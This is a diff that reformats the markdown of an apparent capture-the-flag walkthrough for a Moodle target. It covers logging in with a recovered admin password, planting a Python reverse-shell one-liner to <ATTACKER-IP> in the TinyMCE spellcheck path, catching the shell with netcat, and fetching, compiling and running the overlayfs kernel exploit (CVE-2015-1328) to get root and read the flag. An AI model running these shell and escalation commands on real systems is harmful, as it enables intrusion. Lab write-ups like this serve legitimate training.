@@ -116,10 +116,9 @@ Decoded Admin Password: ```xWinter1995x!```
 ### 9. Moodle Administration & RCE Execution
 
    1. Admin Login:
-
-    Log into the Moodle instance (/gnocertdir/login/index.php) using:
-    Username: admin
-    Password: xWinter1995x!
+        Log into the Moodle instance (/gnocertdir/login/index.php) using:
+        Username: ```admin```
+        Password: ```xWinter1995x!```
 
    2. Configuring the Spellchecker Exploit (TinyMCE RCE):
           Navigate to Site Administration $\rightarrow$ Editor settings / TinyMCE HTML editor $\rightarrow$ Spellcheck settings.
@@ -128,67 +127,89 @@ Decoded Admin Password: ```xWinter1995x!```
 
 ```bash 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- ```
-
+```
 Click Save changes.
 
    3. Triggering the Reverse Shell:
-
-Start a Netcat listener on your Kali machine:
+        Start a Netcat listener on your Kali machine:
     ```bash
     nc -lvnp 443
     ```
 
 Create a new blog post via My profile $\rightarrow$ Blogs $\rightarrow$ Add a new entry.
+
 Type text into the body editor and trigger the spellcheck functionality, executing the payload defined in the aspell path.
    
    4. Shell Caught:The shell connects back, granting execution as www-data:
 
-      ```
+      ```bash
       uid=33(www-data) gid=33(www-data) groups=33(www-data)    
-      pwd: /var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker```
+      pwd: /var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
+      ```
 
+---
 
 ## Root Privilege Escalation
 ### 10. Target System Reconnaissance
-
 After obtaining the shell, enumerate the OS and kernel version:
-        ```uname -a```
+        ```bash
+            uname -a
+        ```
 Output:
-        ```Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux```
+        ```bash 
+            Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+        ```
 
 ### 11. Exploit Execution: overlayfs (CVE-2015-1328)
 
-The target running Ubuntu with Kernel 3.13.0-32 is vulnerable to the overlayfs local privilege escalation exploit (Exploit-DB ID: 37292).
-Host Attacker Web Server:
-Serve the exploit C code (37292.c) using Python on your Kali machine:
-        ```python3 -m http.server 8081```
+The target running Ubuntu with Kernel ```3.13.0-32``` is vulnerable to the overlayfs local privilege escalation exploit (Exploit-DB ID: ```37292```).
+1.Host Attacker Web Server:
+    Serve the exploit C code (```37292.c```) using Python on your Kali machine:
+        ```bash 
+            python3 -m http.server 8081
+        ```
 
-Download Exploit to Target:
-Navigate to the world-writable /tmp directory on the victim host and fetch the file:
-        ```cd /tmp
-wget http://<ATTACKER-IP>:8081/37292.c```
+2. Download Exploit to Target:
+Navigate to the world-writable ```/tmp``` directory on the victim host and fetch the file:
+        ```bash
+           cd /tmp
+           wget http://<ATTACKER-IP>:8081/37292.c
+       ```
 
-Compile Exploit:
+3. Compile Exploit:
 Replace standard compiler flags if needed and compile:
-        ```sed -i "s/gcc/cc/g" 37292.c
-cc 37292.c -o exploited```
+        ```bash
+           sed -i "s/gcc/cc/g" 37292.c
+           cc 37292.c -o exploited
+       ```
 
-Execute Exploit:
+4. Execute Exploit:
 Run the binary to escalate privileges to root:
-        ```./exploited```
+        ```bash
+           ./exploited
+       ```
 
 ### 12. Root Access & Flag Retrieval
 
-Verify Root Privileges:
-        ```id
- Output: uid=0(root) gid=0(root) groups=0(root)```
+1. Verify Root Privileges:
+        ```bash
+               id
+               Output: uid=0(root) gid=0(root) groups=0(root)
+        ```
 
-Read Hidden Root Flag:
-        ```cat /root/.flag.txt```
+2. Read Hidden Root Flag:
+        ```bash
+               cat /root/.flag.txt
+       ```
 
-Contents of .flag.txt:
-        ```Alec told me to place the codes here:
+Contents of ```.flag.txt```:
+       
+        ```bash 
+            
+            Alec told me to place the codes here:
+            
             568628e0d993b1973adc718237da6e93
+            
             If you captured this make sure to go here.....
-            /006-final/xvf7-flag/```
+            /006-final/xvf7-flag/
+        ```
